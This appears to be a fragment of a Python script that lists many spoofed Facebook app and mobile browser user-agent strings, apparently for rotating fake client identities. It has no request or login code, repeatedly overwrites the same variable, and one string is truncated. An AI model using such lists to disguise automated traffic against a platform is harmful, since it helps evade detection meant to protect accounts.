"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/hu_HU;FBCR/Telekom HU;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/pl_PL;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1196};FBLC/en_GB;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D722;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N750;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E700H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850W;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/sv_SE;FBCR/halebop;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500FN;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=768,height=1184};FBLC/en_GB;FBCR/Virgin;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=1.75,width=720,height=1280};FBLC/en_GB;FBCR/Tesco Mobile;FBMF/Archos;FBBD/Archos;FBPN/com.facebook.katana;FBDV/Bush 5"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36 OPR/76.2.4027.73374",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36 OPR/76.2.4027.73374",]
ua = ["Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36 OPR/76.2.4027.73374",]
ua = ["Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0",]
ua = ["Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36 EdgA/127.0.2651.111",]
ua = ["Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36 EdgA/127.0.2651.111",]
ua = ["Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36 EdgA/127.0.2651.111",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36 EdgA/127.0.2651.111",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 GLS/92.10.4949.50",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4896.127 Safari/537.36",]
ua = ["Nintendo Wii U Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104",]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5669.73 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5326.82 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5479.49 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5903.48 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4777.63 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.3011.34 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4336.91 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5565.86 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4342.48 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3242.85 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3495.98 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5260.45 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4573.22 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5046.74 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.3767.91 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.3275.69 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Windows NT 10.0; 11; Windows NT 10.0N50G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4520.72 Chrome/109.0.0.0 Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/373.1.0.8.104",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ['Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]',]
ua = ['Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36',]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/238.0.0.41.116;]']
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]']
ua = ['Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L01A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]']
ua = ['Mozilla/5.0 (Linux; Android 12; MP17 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ['Mozilla/5.0 (Linux; Android 12; 22122RK93C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = ['Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 6.0; CAM-UL00 Build/HONORCAM-UL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",]
ua = ['Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire Eye Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]']
ua = ['Mozilla/5.0 (Linux; Android 11; V1936A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]']
ua = ['Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/418.0.0.11.71;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.1.1 Chrome/114.0.5735.61 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/350.0.0.5.116;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A505W Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5356a [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/320.0.0.12.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/318.0.0.16.105;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; XIAOMI POCO X2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.0.4',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/357.0.0.12.72;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/362.0.0.10.67;]',]
